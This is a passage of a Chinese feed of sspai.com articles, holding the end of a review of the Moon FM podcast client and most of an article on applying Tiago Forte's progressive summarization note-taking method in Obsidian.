则很好的满足上面我提到的诸多针对播客客户端的功能需求，作为一款泛用型播客客户端，Moon FM 支持最为主要的两个桌面操作系统 macOS 以及 Windows 10，甚至还支持略为小众的 Linux，移动端则支持了 iOS 以及 Android，可以说是目前支持平台最全的跨平台泛用型播客客户端了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rh5b34te2hpltpgg.png\"></figure><p>和那些平台型的播客客户端相比，Moon FM 是一款真正意义上的「无账户系统」的播客客户端，无需注册就可以直接进行播客节目的订阅并开始收听。对于没有多端同步需求的用户而言，Moon FM 每一个端都可以作为本地客户端来使用。</p>\n<p>当然 Moon FM 也支持跨端的同步——你可以通过自部署同步服务来实现各个端之间的数据同步，Moon FM 支持同步的数据包括订阅源列表、播放列表、历史记录以及收藏数据等，因此在建立起一个只属于自己的同步服务之后，你可以在任意一个端获得进度一致的播客聆听体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rh5b34te2nr88ftg.png\"></figure><h2>让播客订阅更为简单</h2>\n<p>作为泛用型播客客户端最为重要的功能，如何添加以及管理播客订阅其实最为关键，在 Moon FM 中除了最为基础的 RSS 订阅之外，还有导入 OPML、通过「发现」板块来搜索和发现等多种方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhdb34te12vuo620.png\"></figure><p>最为基础的当然就是 RSS 订阅，在 Moon FM 中需要在 「我的订阅」中点击汉堡菜单中的「RSS 源」，然后在地址框中填入 RSS 订阅地址并点击「加载 RSS 源」，比较智能的是 MoonFM 会检测源的有效性，只有识别并确认有效之后才能被添加，并且对于自制源（使用 RSSHUB 等工具生成的 RSS 订阅源）有着相当不错的兼容性，比如我通过 RSSHUB 生成的一些在网易云音乐上的「电台主播」的播客节目，就可以通过这样的方式在 Moon FM 中进行管理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhlb34te2hpltph0.png\"></figure><p>当然，对于那些并没有 RSS 源地址的播客节目，也可以通过 Moon FM 的「发现」广场来查找和浏览，Moon FM 在「发现」板块中将一些热门的播客节目进行了精选展示，非常适合哪些想听点啥但是不知道哪些类型播客比较符合自己「口味」的听众。</p>\n<p>除了播客之外，发现板块中可以听到一些非播客音频内容——传统的 FM 调频广播。对于哪些不自带 FM 功能的智能手机而言，通过 Moon FM 还能可以听到不受地域限制的各地的电台广播，也收听播客之余也是一个相当不错的聆听选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhtb34te2nr88fu0.png\"></figure><p>此外 Moon FM 也非常细心的设立了播客分类，基本上涵盖了大部分我们可以正常收听到的播客节目类别，适合哪些喜欢某一类播客节目的朋友批量订阅。</p>\n<p>如果你只有几个比较模糊的关键字，但完全记不得完整的播客名，那么也可以善用「搜索」来搜索与之相关的播客节目源——你只需要输入相关的关键字，就可以在 Moon FM 收录的播客中找到与之匹配的播客节目源。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ri5b34te2nr88fug.png\"></figure><p>除了上面提到的这些单个的播客订阅，事实上 Moon FM 还支持批量导入订阅源的方式，尤其是当你需要从某个泛用型播客客户端中迁移到 Moon FM 时可以极大地减少工作量，当然反之也可以导出你在 Moon FM 的订阅源，可谓是真正的来去自由。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ri5b34te2r9sanug.png\"></figure><p>在我的订阅中，你还可以对当前已经订阅的播客节目进行整理，比如查看每一个播客的详情，当前播客下面的节目列表以及每一个节目的 Show Notes，对于已经断更的节目或者你不再关注的节目则可以取消订阅来整理，从而保持你的订阅列表中的播客在每一天都是「新鲜的」。</p>\n<h2>要好订阅也要好「放」</h2>\n<p>播客客户端除了方便订阅之外，另一项最为重要的功能就是「播放」了，相比其他泛用型播客客户端，Moon FM 在播放上做的其实非常「接地气」，乍一看平平无奇，实际上在使用过程中会发现非常实用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ridb34te2r9sanv0.png\"></figure><p>比如在收听板块中最近更新的各个播客节目最新的 List，仔细观察你会发现在每一个 list 下都有丰富的控制组件。比如在手机端可以通过向左滑动以及向右滑动 list 来进行控制，除了常用的直接播放之外，另外还可以对当前的节目进行下载，或者将其添加到下一个播放条目中中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ritb34te2nr88fv0.png\"></figure><p>这种针对节目 list 进行「预操作」的好处适用于很多收听场景，比如在腾不开手操作时可以在播放完当前节目后，让播放列表自动播放下一个添加的节目。而离线下载更适合没有网络的场景下播放，比如当你使用 iPod Touch / iPad 这样没有蜂窝数据的设备时，可以在有无线网络的环境中进行预先离线下载，这样在没有网络的场景下也可以进行收听播客节目。</p>\n<p>再回到播放本身，Moon FM 在播放器功能方面也主打实用为主，例如它同样支持倍速播放功能，如果你习惯通过播客学英语，倍速播放可以让你循序渐进地提升英语听力；当然你也可以用在一些语速比较慢的谈话类播客上，实现尽快地听完节目内容）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rj5b34te12vuo62g.png\"></figure><p>另一项我觉得很实用的播客播放控制就是「睡眠定时」，我个人喜欢在睡前听一些故事类或者舒眠类的播客节目，而这个定时功能则可以让声音在一段时间后关闭，从而避免因为持续的播放最终打扰到正常的睡眠。</p>\n<p>Moon FM 中的睡眠倒计时除了可以选择特定的时间（15分钟 / 30分钟 / 45分钟 / 1小时）之外，还可以直接设定一个单集播放结束就不再播放，在设定上相对而言也比较灵活。而对于播客节目本身，Moon FM 还支持直接展示播客节目的 Show Notes，方便在聆听之余来对节目内容有更深入的了解。</p>\n<h2>自定义你的播客客户端</h2>\n<p>Moon FM 有着良好的跨平台特性，这不仅仅表现在多个平台的支持上，还表现在其在移动端和桌面端都有着高度一致的 UI 界面。流行的圆角卡片式设计让整个功能布局分区明显，结合手势可以实现更快的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rjdb34te2hpltphg.png\"></figure><p>在此基础上，Moon FM 还加入了一项适用于手机端的「底部导航 tab 的自定义」功能，我们可以实现一定程度的播放器界面自定义——你可以选择你需要的板块呈现在 底部 Tab 上。</p>\n<p>举例来说，我使用 Moon FM 的手机端以及桌面端，并且自建了同步服务，因此管理订阅源以及发现新播客这部分需求主要在桌面端来操作，因此我的手机端则主要作为「纯播放端」而非「管理端」。所以只需要在 Tab 中展示「收听」「订阅」「播放列表」以及「我的」，至于「发现」「下载」「收藏」以及「搜索」功能则都不显示。从而确保了显示空间以及功能上的平衡。</p>\n<h2>结语</h2>\n<p>总的来说，作为一款国产的泛用型播客客户端，Moon FM 有着相当多的让人眼前一亮的优点：支持几乎全部流行的操作系统平台，支持自部署的方式来实现个人播客数据同步，丰富的订阅和探索新节目的方式以及实用的播放控制功能等等。如果你恰巧正在找一款纯粹实用的泛用型播客客户端，那么 Moon FM 或许是你不容错过的选择。</p>\n<p>你可以在 <a href=\"https://moon.fm/get-app\" target=\"_blank\">官网</a> 找到各个平台 Moon FM 的下载地址，少数派软件商城也上架了 Moon FM 的 macOS 和 Windows 版本，你可以在 <a href=\"https://sspai.com/item/280\" target=\"_blank\">这里</a> 进行购买。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"280\" type=\"genuineSoftware\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68895"},{"title":"玩转 Obsidian 06：如何用渐进式总结笔记，把知识交给未来的自己","date":"2021-09-29 03:33:35","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/263\" target=\"_blank\">知识管理之术</a> 专栏，和大家探讨「知识管理」的各种层级和方法，其目的为启发思考与共同探索并找到适合自己的「知识管理之术」。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中介绍了如何使用 <a href=\"https://chrome.google.com/webstore/detail/roam-highlighter/mcoimieglmhdjdoplhpcmifgplkbfibp\">Roam-highlighter</a> 搭配 Obsidian 完成「知识循环」的「阅读和记录」环节，今天将继续介绍「知识循环」的「整理环节」。</p>\n<blockquote><p>知识循环指的是以「写作」为唯一目的的「知识管理」方式，在「写作」的过程 中经历阅读/记录/整理和输出</p></blockquote>\n<p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在他的文章《<a href=\"https://fortelabs.co/blog/progressive-summarization-a-practical-technique-for-designing-discoverable-notes/\">Progressive Summarization: A Practical Technique for Designing Discoverable Notes | 渐进式总结：设计可发现笔记的实用技术</a>》中提出「现阶段知识管理的困难」：</p>\n<blockquote><p>在数字世界，你可以获取任何内容（图片、音频、视频等），所以现在人们使用工具管理知识的困难不再是如何记录、保存内容，真正的困难是如何将「好的、有用的、非常重要的内容留给未来」。</p></blockquote>\n<h2>为什么把知识留给未来</h2>\n<p>相信大家或多或少的都会做一些「知识管理」，我们存储了很多知识笔记：摘录一篇文章、收藏一篇笔记、保存一个观点等。在《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》中介绍了个人知识管理经历过三个阶段，其中<code>阶段2: 已整理为目的的「知识管理」</code>中虽然我会将笔记按照「标签」进行分类和管理，使得内容更加容易被发现，但是时间长了之后发现这些知识仍然是一潭死水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/e50da78d15b144ae2017d9faa780e233.png\"><figcaption>图片来自：《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</figcaption></figure><p>一些内容即使做了整理和标记，时间长了也很难记清楚<strong>当时关注的重点是什么</strong>，大概率找到笔记还要重新熟悉和了解后才知道它有没有用，举几个例子：</p>\n<ul>\n<li>看到了一篇文章，当时觉得文中一部分关于「西方艺术史」的内容对自己有帮助（当时可能正在关注此类话题）。所以做了笔记摘录。隔了两年以后再看到这篇文章很可能完全记不起来<strong>当时为什么保存这篇文章</strong>以及<strong>文章的重点是什么</strong>。</li>\n<li>看了一本关于职场酒桌礼仪的书籍，过了许多年以后以后才有用上的机会。</li>\n<li>甚至在笔记中<strong>看到标题都想不起自己为什么存它</strong>。</li>\n</ul>\n<p>给大家看几篇 <strong>2016 年</strong>存入 Evernote 的笔记（摘录原文），乍看之下已经很难一下抓住文章重点，都需要重新阅读：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/059815ae6bd9647ed82f1906d8d793b6.png\"><figcaption>Evernote 早期笔记</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d71ca3651666bd0152ad591e9a070751.png\"><figcaption>Evernote 早期笔记</figcaption></figure><p>为什么要把知识「交给未来的自己」？我认为最大的原因就是：<strong>随着时间的积累，很可能已经忘了当时对这篇文章的理解以及收藏它的初衷</strong>。</p>\n<p>试想一下，如果在未来阅读曾经的笔记时，不再担心「忘记笔记的重点」，甚至也不需要「重新梳理」原文重点，只需用到什么拿什么。那么这段知识就真正成为了可以随身携带的「知识宝库」，并且做到了「随心用之，用之不竭」。</p>\n<h2>如何将知识交给未来的自己</h2>\n<p>现实中有一部分人确实可以凭借超强记忆记住自己的绝大部份学（收集）到的知识，但是大部分人做不到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/acc82364f1cce4eaae5df669fd23b7e0.png\"><figcaption>图片来自：<a href=\"https://fortelabs.co/blog/progressive-summarization-a-practical-technique-for-designing-discoverable-notes/\">Progressive Summarization: A Practical Technique for Designing Discoverable Notes</a></figcaption></figure><p>因为做不到强行记忆，所以许多人的知识管理只做到了第一步「收集」，从而陷入「收藏家谬论」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d0432e463ce25f7ef1c14ca737bdaf8c.png\"><figcaption>图片来自：<a href=\"https://sspai.com/post/62414\">玩转 Obsidian | 打造知识循环利器 - 少数派</a></figcaption></figure><p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在文章中就提出了这样的观点：</p>\n<blockquote><p>我们真正的困难是「知道哪些知识值得获取」，这个挑战在于要「建立一个体系」，通过时间将「知识碎片」交给未来最合适和最需要的情况或场景中。</p></blockquote>\n<p>所以「如何将知识交给未来的自己」，重点就是建立一套体系，文中 <a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 给出的办法是「渐进式总结」：</p>\n<blockquote><p>渐进式总结指的是在<strong>不同的时间段</strong>对某个信息进行<strong>小规模的总结和浓缩</strong>，并形成「原子化」的知识片段，同时尽可能保持其「可发现性和可理解性」。</p></blockquote>\n<p>概念中有几个关键字分别是<strong>不同时间段、小规模、浓缩、原子化、可发现性、可理解性</strong>，而这正是我们「为未来的自己设计一个产品」的关键。</p>\n<h3>设计「渐进式总结笔记」</h3>\n<p>在介绍之前先了解一下设计「渐进式总结」的三个重点。</p>\n<h4>重点 1：具备销售思维</h4>\n<blockquote><p>设计这个系统的时候用「销售思维」去考虑如何将知识「卖给」未来的自己。</p></blockquote>\n<p>换句话说，一段知识如果想让未来的自己享用，那就一定做好「包装」，做到可以「打动」未来的自己，即，<strong>千方百计地吸引未来的自己对这个商品（一篇笔记）感兴趣</strong>。</p>\n<p>假设未来的自己是一位非常刁钻的客户，我们必须像真正的销售员那样，想方设法的引起客户的关注、激发客户的兴趣并建立信誉激起欲望，给出客户选择我们的「充足理由」。</p>\n<p>在实践中就要求我们合理化地突出笔记重点以及做好总结，用这些内容来吸引未来的自己阅读它。</p>\n<h4>重点 2：原子化笔记</h4>\n<p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在文章中提出了「笔记优先法则」：</p>\n<blockquote><p>即我们管理笔记不应该被标签或文件夹限制住（存放在哪里），更应该关注笔记内容本身。笔记应该具备「原子性」，每个原子有自己的特性，并可以随时组成更强大的元素或分子化合物。</p></blockquote>\n<p>理解「原子化笔记」有两个重点：</p>\n<ul>\n<li>原子性：即最小力度的说明一个概念，标准就是它可以在任何地方被引用，用来说明自己。</li>\n<li>自主性：先理解一个概念，在一本书中，它的每一页都是有上下文关系的，也就是说，每一页的存在位置是固定的，如果被挪走或删除，会影响这本书的阅读。而在「笔记优先法则」中的「原子笔记」却与之相反，它应该是自主的，它能够独自说明一件事，可以被独立理解。也就是它和邻近的笔记没任何关系，它可以被移动、分离和连接。</li>\n</ul>\n<p>「原子化笔记」要求我们将笔记尽可能的「原子化」存储，并使其满足「原子性」和「自主性」。在实践中可以通过「双向链接」将相关的「原子笔记」关联到当前笔记中。如果还不了解「双向链接」可以查看之前的文章《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》。</p>\n<h4>重点 3：设计高度浓缩的摘要笔记</h4>\n<p>设计留给未来的笔记，要求我们制作「高度浓缩的笔记」，这意味着笔记要同时满足「可发现性」和「可理解性」。</p>\n<p><strong>可发现性：</strong>笔记具备「可发现性」，指的是笔记的内容要<strong>小巧、简单、易于消化</strong>。</p>\n<p><strong>可理解性：</strong>即笔记要有足够的细节，来源、例子和引用，都要在笔记中有线索，不能有所遗漏。</p>\n<p>「可发现性和可理解性」要同时满足最大的困难是：<strong>因为我们不可能在「不舍弃文章中大部分观点的情况下」而进行总结；就像如果不剪辑掉大部分镜头，就无法制作视频精华片段一样。</strong></p>\n<p>「鱼和熊掌不可兼得」，这就要求我们从中找到平衡点：</p>\n<ul>\n<li>笔记压缩太多，就会失去重点。</li>\n<li>如果保留所有细节，就会失去重点。</li>\n</ul>\n<p>所以选择「合适的压缩比例」是一件非常重要且需要技巧的事情。</p>\n<blockquote><p>在思考保留什么的时候，你一定也在思考丢弃什么！</p></blockquote>\n<p>总结一下，我们要设计一款「传递给未来的自己」的笔记系统要满足如下条件：</p>\n<ul>\n<li>销售思维：即我们设计笔记要有销售思维，想方设法引起未来的自己注意，并提供出未来的自己感兴趣的内容。</li>\n<li>原子化：即我们尽量原子化记录笔记内容，在适当的地方通过「双向链接」进行引用，从而形成知识网络。</li>\n<li>实现高度浓缩的摘要，尽量保留原文的重要观点，又要为未来的自己指明文章重点。而这需要做好取舍。</li>\n</ul>\n<h2>渐进式总结实践</h2>\n<h3>TIAGO FORTE 的实践</h3>\n<p>文章中，TIAGO FORTE 阐明了自己的对「渐进式总结」的实现方式，为了便于大家理解，再次引用一下上文提到的「渐进式总结」的概念：</p>\n<blockquote><p>在<strong>不同的时间段</strong>对某个信息进行<strong>小规模的总结和浓缩</strong>。并形成「原子化」的知识片段，同时尽可能保持其「可发现性和可理解性」。</p></blockquote>\n<p>TIAGO FORTE 的方式就是将笔记分层处理，将「不同时间段」对文章的「小规模总结」，进行分别记录。每个时间段一层，这样在我们阅读笔记的时候，完全可以快速找到笔记的重点（包含不同时期整理的重点信息）。即保留了重点，又能最大限度的还原笔记的主旨。</p>\n<p>一个符合 TIAGO FORTE 「渐进式总结」的范例：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/3675bab3b93d30d796bc43902895ae14.jpeg\"><figcaption>渐进式总结范例</figcaption></figure><h4>第零层：原文</h4>\n<p>TIAGO FORTE 在「渐进式总结」中将原文作为总结笔记的第零层，这一层也称为「原始素材」，它也是后续所有笔记的基础。</p>\n<p>这一层其实是并不在「笔记」中存在，它只是笔记的一段来源记录，包括作者、链接等信息，仅此而已。</p>\n<h4>第一层：原文摘要</h4>\n<p>TIAGO FORTE 的「渐进式总结」实践中最重要的就是「第一层」，他称之为「Notes」我称之为「原文摘要」。</p>\n<p>这实际上是我们很多人都在做的，也是上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中重点介绍的内容。</p>\n<p>这一层没有什么特殊规则，只需要按照每个人对文章的理解进行「摘录」，并将摘录内容保存到笔记中即可。</p>\n<p>关于「第一层」对「原文摘要」的处理方式，推荐几种个人常用或了解的方式：</p>\n<ul>\n<li>Chrome 浏览器推荐使用《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中推荐的扩展 <a href=\"https://chrome.google.com/webstore/detail/roam-highlighter/mcoimieglmhdjdoplhpcmifgplkbfibp\">Roam-highlighter</a>。</li>\n<li>「简悦」作者推荐的简悦插件「<a href=\"https://zhuanlan.zhihu.com/p/412710060\">Live Editor</a>」，搭配「<a href=\"http://ksria.com/simpread/\">简悦</a>」一起使用，支持 Safari 等平台。</li>\n<li>如果你恰好是 <a href=\"https://readwise.io/\">readWise</a> 的会员，推荐使用 <a href=\"https://web.hypothes.is/\">Hypothesis</a> 进行摘录（支持 iPad 摘录），它会自动同步到 readWise，再通过 readWise 自动转存到 Obsidian。这个方式的特点是实现了「跨平台」和「自动化」。</li>\n</ul>\n<p>第一层是非常重要的，可以没有「第零层」但一定要有「第一层 - 原文摘要」，它是一切的基石。</p>\n<h4>第二层：重点摘要</h4>\n<p>TIAGO FORTE 认为，如果我们对只有「第一层」的笔记进行阅读时，如果有了新的感悟发现了新的重点，可以在「第一层」基础上，进行二次处理，他称这一层为「Bold passages」，我称之为「重点摘要」。</p>\n<p>第二层是对第一层的总结，主要是对第一层中的「核心观点」以及「关键词」等进行「加粗」处理，而这对于笔记软件来说非常容易（指的是加粗操作）。</p>\n<p>按照「渐进式总结」概念，通常是在「稍后的时间」对只有「第一层」的文章进行整理，这一点也很好理解，如果我们在未来去读一篇文章，一定是它对我们有吸引力，而在这个过程中产生了新的想法，我们也是随手「加粗标注」，这样既完成了阅读，又能为未来留下「精华」，简直是一举两得的事情。</p>\n<h4>第三层：高亮摘要</h4>\n<p>在 TIAGO FORTE 的「渐进式总结」中，当我们对一篇笔记进行阅读，再次有新的感悟，并觉得有些真正有价值的内容需要被第一时间看到，他会选择对笔记内容进行「高亮」处理，这一层他称之为「Highlighted passages」我称之为「高亮摘要」。</p>\n<p>这一层只对「真正有价值」的内容进行摘要，在任何时候我们查看笔记，都可以随时进行「高亮摘要」，而这一层将成为「最亮眼」的一层，原因是在笔记中高亮比加粗更加明显，而这也是我们的目的。</p>\n<p>在未来的某个时刻，如果关注到这篇笔记，通过高亮内容第一时间可以专注文章的重点，减少我们的认知负担，同时由于第一层和第二层的存在，我们又不会丢失很多细节，所以第三层是「渐进式总结」的精华所在。</p>\n<p>下图中通过「高亮样式」可以一目了然发现文章「重点」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/10c9b686dbea1226e731a665797295f7.png\"><figcaption>高亮样式的特点</figcaption></figure><h4>第四层：总结</h4>\n<p>第四层的方式为「在笔记的顶端用自己的话进行总结」，这里的重点是一定要「用自己的话」进行描述，总结的内容是对第二层和第三层进行概括。</p>\n<p>第四层跟我们在本系列「玩转 Obsidian」中反复提到的「知识循环」概念一致，即最终我们要用自己的话表达出来，这段知识才能变成自己的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d8f185351e977e14472dc5cac7dbf209.png\"><figcaption>图片来自：《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</figcaption></figure><p>当然总结这件事是非常主观的行为，那就意味着我们可能在总结中遗漏某些细节或重点。幸好我们有多层笔记保障，每一层都是一个时期的理解，这样我们才可放心大胆的对知识进行总结。</p>\n<h4>小结</h4>\n<p>以上是 TIAGO FORTE 「渐进式总结」的概要介绍，它包含如下内容：</p>\n<ul>\n<li>第一层：原文摘要，指的是将原文中重要的信息摘录到笔记中。</li>\n<li>第二层：重点摘要，在第一层基础上，对其中更为核心的观点或关键词进行「加粗」处理。</li>\n<li>第三层：高亮摘要，在第一二层基础上，对一些重点段落进行「高亮」处理，突出文章的主旨。</li>\n<li>第四层：总结，「用自己的话」去描述和概括对当前笔记的理解。</li>\n</ul>\n<p>以上四层结构组成的「渐进式总结」方法，基本上满足了我们在前文提到的三个重点，即笔记中既有足够的信息保证内容不失真（原文摘要），又有足够的亮点帮我们快速理解（高亮+总结）。这是一套非常行之有效的方法。</p>\n<p>TIAGO FORTE 在文章最后也强调了一点，对于部分笔记由于其内容对自己有启发，并随之产生了许多想法，他的做法会单独写一篇笔记进行阐述，而不是像「第1-4层」那样在同一篇笔记中完成，因为这篇文章完全是自己站在「原始素材」的基础上总结和归纳，并用自己的话写出来的文章，他应该是和「原始素材」分开，不至于影响我们对「原始素材」的理解。</p>\n<p>同样这也是在「玩转 Obsidian」这个系列中一直强调的「知识循环」的概念的重点「写作」：</p>\n<blockquote><p>知识循环指的是以「写作」为唯一目的的「知识管理」方式，在「写作」的过程 中经历阅读/记录/整理和输出 。</p></blockquote>\n<p>我们积累知识不是因为得了「松鼠症」而囤积大量的笔记，我们的最终目的还是为了获得知识，即用自己的话进行描述并最终写出来（发布出来）。这样才能说真正的「获得了知识」。</p>\n<h3>在 Obsidian 中实践</h3>\n<p>结合 TIAGO FORTE 的「渐进式总结」，个人在 Obsidian 中进行了实践，并结合 Obsidian 的功能特效进行了改良。</p>\n<p>在 Obsidian 中同样采用「分层总结」将「不同时间段」的总结分别记录到各层中，每一层分别为「第一层：原文摘要」、「第二层：重点摘要」、「第三层：常青笔记」、「第四层：闪念」和「第五层：总结」。</p>\n<p>在上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中介绍过通过「模板」添加「摘要大纲」的方法，这里同样在每次需要将文章摘录到 Obsidian 中的时候，通过「模板功能」快速插入「摘要模版」，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/a33959f83f80412a3ce29a053923bb80.png\"><figcaption>「渐进式总结」的模板</figcaption></figure><h4>第一层：原文摘要</h4>\n<p>这一层同 TIAGO FORTE 的原意一样，将原始文章中的较为重要的信息「摘录」到笔记当中，在《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中详细介绍过摘录的方法。</p>\n<p>有一点不同的是，在第一层我就会对一些稍微重要的信息进行「加粗处理」（用一对 <code>**</code>包裹着内容），这会让我在未来「回看笔记」时快速理解第一层信息：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/38cde9475edab1bb4f6bbea76ed8724b.png\"><figcaption>第一层进行「加粗」处理</figcaption></figure><h4>第二层：重点摘要</h4>\n<p>不同于 TIAGO FORTE 的方法 ，一般我会在完成「第一层：原文摘要」后马上就整理「第二层：重点摘要」，虽然我会遵循「不同的时间段完成不同层级」的规则，但是在阅读或整理笔记的当下，如果觉得有些内容需要重点标注，就会第一时间将「第一层」内容拷贝到「第二层」进行「重点标注」，同时如果有必要我也会添加自己的「注释」，方便进行辅助理解。</p>\n<p>在 Obsidian 的第二层中对于「部分内容」使用一对 <code>==</code> 包裹起来达到「高亮」效果，这样的突出效果是为了让未来的自己阅读到笔记时可以快速了解「第二层」的内容（相对的，第一层使用一对 <code>**</code> 加粗处理）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/c89685494b7352a8c2c5326492c5f77c.png\"><figcaption>第二层进行「高亮」处理</figcaption></figure><p> </p>\n<h4>第三层：常青笔记</h4>\n<p>常青笔记，也称为永久笔记。如果当前笔记的阅读让我产生了新的灵感，就像 TIAGO FORTE 说的那样，站在「原始素材」的基础上写一篇文章，然后通过「双向链接」将笔记添加到「第三层：常青笔记」中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/5292ce97a2363893fb0bcc7097f50671.png\"><figcaption>第三层「常青笔记」</figcaption></figure><p>这一层并不经常有内容，除了刚才所说的「新灵感」之外还有一种情况需要添加到「第三层」中，即当发现当前笔记中有一些「独立且重要的概念」时，马上提炼概念内容，写到新的笔记（卡片）中，最后关联到第三层。</p>\n<p>为了便于大家理解这一点，我们看一下个人总结的「卡片盒笔记法」的三个原则：</p>\n<ul>\n<li>原则1：卢曼的「卡片盒笔记法」中的笔记不仅仅是总结性质内容，更重要的是「对想法的阐述」。</li>\n<li>原则2：卢曼的笔记都是「用自己的话术」进行描述。</li>\n<li>原则3：每张卡片都可以完整描述一个想法，并且只描述一个想法，且通常卡片的内容「短小精练」。</li>\n</ul>\n<p>下图就是应用「卡片盒笔记法」三原则生成的新笔记（新卡片），并添加到「第三层：常青笔记」中：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/ae376ad66efa6d28224896096918bfe9.png\"><figcaption>「卡片盒笔记法」三原则的使用</figcaption></figure><h4>第四层：闪念</h4>\n<p>闪念的概念来自于老罗出品的锤子手机的「闪念胶囊」功能，当年用过之后念念不忘，甚至一度使用锤子手机作为备机，虽然我只对这一个功能感兴趣（后来未遂，原因是两个手机带着不方便），但是这个概念被我借鉴且继承下来。</p>\n<p>这一层主要存放那些「灵光一现」的内容，当阅读笔记的当下突然某一段内容产生了一些灵感，随手记录在「第四层」，并设置好标签「闪念胶囊」方便将来索引。</p>\n<p>记录的内容通常三类</p>\n<ul>\n<li>记录一段话，设置好对应的标签或关联其他「笔记」</li>\n<li>只记录一个标题，并设置为 Todo 模式，并用「双向链接」占位，即「不创建笔记内容，只有标题」等有时间在完善。</li>\n</ul>\n<p>我会在固定的时间对「闪念」内容整体回归，该完成的 Todo 就完成，该阅读的文章就会选择合适的时间阅读，总之，<strong>这些灵感不会丢失，更重要的是灵感也不会失去「上下文」</strong>。试想一下，若非如此我们在一年后看到某条「闪念」，估计很难能回忆起来当时为什么记录它。</p>\n<p>下图为「渐进式总结」中「闪念」的实践，<strong>在某一时刻完成了「闪念」对应的任务</strong>：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/2d812c792642c32f24e4478901e4976c.png\"><figcaption>第四层：闪念</figcaption></figure><h4>第五层：总结</h4>\n<p>这一层同 TIAGO FORTE 的介绍一样，用自己的话描述对当前笔记的总结，不一样的是这一段内容也是随时可以写的，可以摘录笔记完成第一层之后就写，也可以是未来的任何时间段，阅读到这篇笔记有感而写。总之只要是用自己的话进行概述的内容都可以放在这一层。</p>\n<p>第五层总结中同样可以利用「加粗」和「高亮」增加总结内容的「亮点」，方便日后进行翻看的时候快速找到关键信息，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/8e380c6493474fc21bcce9a5964f8264.png\"><figcaption>第五层也可以「加粗」和「高亮」</figcaption></figure><h4>小结</h4>\n<p>在 Obsidian 中实践「渐进式总结」同 TIAGO FORTE 